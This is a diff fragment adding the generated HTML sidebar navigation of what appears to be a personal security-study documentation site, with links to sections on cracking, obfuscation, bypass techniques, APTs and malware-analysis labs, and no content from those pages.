+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/docs/remaining/bypass/"
+    
+  >Bypass
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/docs/remaining/itemlearn/"
+    
+  >ItemLearn
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col open"><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      sidebar-active-item hx-bg-primary-100 hx-font-semibold hx-text-primary-800 contrast-more:hx-border contrast-more:hx-border-primary-500 dark:hx-bg-primary-400/10 dark:hx-text-primary-600 contrast-more:dark:hx-border-primary-500"
+    href="/docs/remaining/2024-7-10-lab/"
+    
+  >Lab
+    </a>
+  
+    <ul class='hx-flex hx-flex-col hx-gap-1 hx-relative before:hx-absolute before:hx-inset-y-1 before:hx-w-px before:hx-bg-gray-200 before:hx-content-[""] dark:before:hx-bg-neutral-800 ltr:hx-pl-3 ltr:before:hx-left-0 rtl:hx-pr-3 rtl:before:hx-right-0 ltr:hx-ml-3 rtl:hx-mr-3'><li>
+              <a
+                href="#%e6%81%b6%e6%84%8f%e4%bb%a3%e7%a0%81%e5%88%86%e6%9e%90%e5%ae%9e%e6%88%98%e7%9a%84%e5%ae%9e%e9%aa%8c"
+                class="hx-flex hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [word-break:break-word] hx-cursor-pointer [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] contrast-more:hx-border hx-gap-2 before:hx-opacity-25 before:hx-content-['#'] hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:hx-text-gray-900 contrast-more:dark:hx-text-gray-50 contrast-more:hx-border-transparent contrast-more:hover:hx-border-gray-900 contrast-more:dark:hover:hx-border-gray-50"
+              >《恶意代码分析实战》的实验</a>
+            </li>
+          </ul>
+  
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/docs/remaining/obfu/"
+    
+  >Obfu
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/docs/remaining/program-analysis/"
+    
+  >Program Analysis
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/docs/remaining/web/"
+    
+  >Web
+    </a>
+              
+            </li></ul>
+      </div>
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/docs/windows/"
+    
+  >Windows
+        <span class="hextra-sidebar-collapsible-button"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor" class="hx-h-[18px] hx-min-w-[18px] hx-rounded-sm hx-p-0.5 hover:hx-bg-gray-800/5 dark:hover:hx-bg-gray-100/5"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" class="hx-origin-center hx-transition-transform rtl:-hx-rotate-180"></path></svg></span>
+    </a>
+              <div class="ltr:hx-pr-0 hx-overflow-hidden">
+        <ul class='hx-relative hx-flex hx-flex-col hx-gap-1 before:hx-absolute before:hx-inset-y-1 before:hx-w-px before:hx-bg-gray-200 before:hx-content-[""] ltr:hx-ml-3 ltr:hx-pl-3 ltr:before:hx-left-0 rtl:hx-mr-3 rtl:hx-pr-3 rtl:before:hx-right-0 dark:before:hx-bg-neutral-800'><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/docs/windows/windows-bas/"
+    
+  >Windows BAS
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/docs/windows/windows-beg/"
+    
+  >Windows BEG
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/docs/windows/windows-ext/"
+    
+  >Windows EXT
+    </a>
+              
+            </li></ul>
+      </div>
+            </li></ul>
+      </div></li>
+    </ul>
+
+    <ul class="hx-flex hx-flex-col hx-gap-1 max-md:hx-hidden">
+        
+          <li class=""><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/docs/crack/"
+    
+  >Crack
+        <span class="hextra-sidebar-collapsible-button"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor" class="hx-h-[18px] hx-min-w-[18px] hx-rounded-sm hx-p-0.5 hover:hx-bg-gray-800/5 dark:hover:hx-bg-gray-100/5"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" class="hx-origin-center hx-transition-transform rtl:-hx-rotate-180"></path></svg></span>
+    </a><div class="ltr:hx-pr-0 hx-overflow-hidden">
+        <ul class='hx-relative hx-flex hx-flex-col hx-gap-1 before:hx-absolute before:hx-inset-y-1 before:hx-w-px before:hx-bg-gray-200 before:hx-content-[""] ltr:hx-ml-3 ltr:hx-pl-3 ltr:before:hx-left-0 rtl:hx-mr-3 rtl:hx-pr-3 rtl:before:hx-right-0 dark:before:hx-bg-neutral-800'><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/docs/crack/crack/"
+    
+  >Crack
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/docs/crack/crackext/"
+    
+  >CrackEXT
+    </a>
+              
+            </li></ul>
+      </div></li>
+          <li class=""><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/docs/homework/"
+    
+  >Homework
+        <span class="hextra-sidebar-collapsible-button"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor" class="hx-h-[18px] hx-min-w-[18px] hx-rounded-sm hx-p-0.5 hover:hx-bg-gray-800/5 dark:hover:hx-bg-gray-100/5"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" class="hx-origin-center hx-transition-transform rtl:-hx-rotate-180"></path></svg></span>
+    </a><div class="ltr:hx-pr-0 hx-overflow-hidden">
+        <ul class='hx-relative hx-flex hx-flex-col hx-gap-1 before:hx-absolute before:hx-inset-y-1 before:hx-w-px before:hx-bg-gray-200 before:hx-content-[""] ltr:hx-ml-3 ltr:hx-pl-3 ltr:before:hx-left-0 rtl:hx-mr-3 rtl:hx-pr-3 rtl:before:hx-right-0 dark:before:hx-bg-neutral-800'><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/docs/homework/crack-homework/"
+    
+  >Crack-homework
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/docs/homework/homework/"
+    
+  >Homework
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/docs/homework/homeworkbas/"
+    
+  >HomeworkBAS
+    </a>
+              
+            </li></ul>
+      </div></li>
+          <li class="open"><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/docs/remaining/"
+    
+  >Remaining
+        <span class="hextra-sidebar-collapsible-button"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor" class="hx-h-[18px] hx-min-w-[18px] hx-rounded-sm hx-p-0.5 hover:hx-bg-gray-800/5 dark:hover:hx-bg-gray-100/5"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" class="hx-origin-center hx-transition-transform rtl:-hx-rotate-180"></path></svg></span>
+    </a><div class="ltr:hx-pr-0 hx-overflow-hidden">
+        <ul class='hx-relative hx-flex hx-flex-col hx-gap-1 before:hx-absolute before:hx-inset-y-1 before:hx-w-px before:hx-bg-gray-200 before:hx-content-[""] ltr:hx-ml-3 ltr:hx-pl-3 ltr:before:hx-left-0 rtl:hx-mr-3 rtl:hx-pr-3 rtl:before:hx-right-0 dark:before:hx-bg-neutral-800'><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/docs/remaining/ai/"
+    
+  >AI
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/docs/remaining/app/"
+    
+  >APP
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/docs/remaining/apts/"
+    
+  >APTs
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/docs/remaining/bypass/"
+    
+  >Bypass
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/docs/remaining/itemlearn/"
+    
+  >ItemLearn
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col open"><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      sidebar-active-item hx-bg-primary-100 hx-font-semibold hx-text-primary-800 contrast-more:hx-border contrast-more:hx-border-primary-500 dark:hx-bg-primary-400/10 dark:hx-text-primary-600 contrast-more:dark:hx-border-primary-500"
+    href="/docs/remaining/2024-7-10-lab/"
+    
+  >Lab
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/docs/remaining/obfu/"
+    
+  >Obfu
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/docs/remaining/program-analysis/"
+    
+  >Program Analysis
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/docs/remaining/web/"
+    
+  >Web
+    </a>
+              
+            </li></ul>
+      </div></li>
+          <li class=""><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/docs/windows/"
+    
+  >Windows
+        <span class="hextra-sidebar-collapsible-button"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor" class="hx-h-[18px] hx-min-w-[18px] hx-rounded-sm hx-p-0.5 hover:hx-bg-gray-800/5 dark:hover:hx-bg-gray-100/5"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" class="hx-origin-center hx-transition-transform rtl:-hx-rotate-180"></path></svg></span>
+    </a><div class="ltr:hx-pr-0 hx-overflow-hidden">
+        <ul class='hx-relative hx-flex hx-flex-col hx-gap-1 before:hx-absolute before:hx-inset-y-1 before:hx-w-px before:hx-bg-gray-200 before:hx-content-[""] ltr:hx-ml-3 ltr:hx-pl-3 ltr:before:hx-left-0 rtl:hx-mr-3 rtl:hx-pr-3 rtl:before:hx-right-0 dark:before:hx-bg-neutral-800'><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/docs/windows/windows-bas/"
+    
+  >Windows BAS
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/docs/windows/windows-beg/"
+    
+  >Windows BEG
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/docs/windows/windows-ext/"
+    
+  >Windows EXT
+    </a>
+              
+            </li></ul>
+      </div></li>
+        
+      </ul>
+    </div>
+  
+  
+    <div class="  hx-sticky hx-bottom-0 hx-bg-white dark:hx-bg-dark hx-mx-4 hx-py-4 hx-shadow-[0_-12px_16px_#fff] hx-flex hx-items-center hx-gap-2 dark:hx-border-neutral-800 dark:hx-shadow-[0_-12px_16px_#111] contrast-more:hx-border-neutral-400 contrast-more:hx-shadow-none contrast-more:dark:hx-shadow-none hx-border-t" data-toggle-animation="show"><div class="hx-flex hx-grow hx-flex-col"><button
+  title="Change theme"
+  data-theme="light"
+  class="theme-toggle hx-group hx-h-7 hx-rounded-md hx-px-2 hx-text-left hx-text-xs hx-font-medium hx-text-gray-600 hx-transition-colors dark:hx-text-gray-400 hover:hx-bg-gray-100 hover:hx-text-gray-900 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50"
+  type="button"
+  aria-label="Change theme"
+>
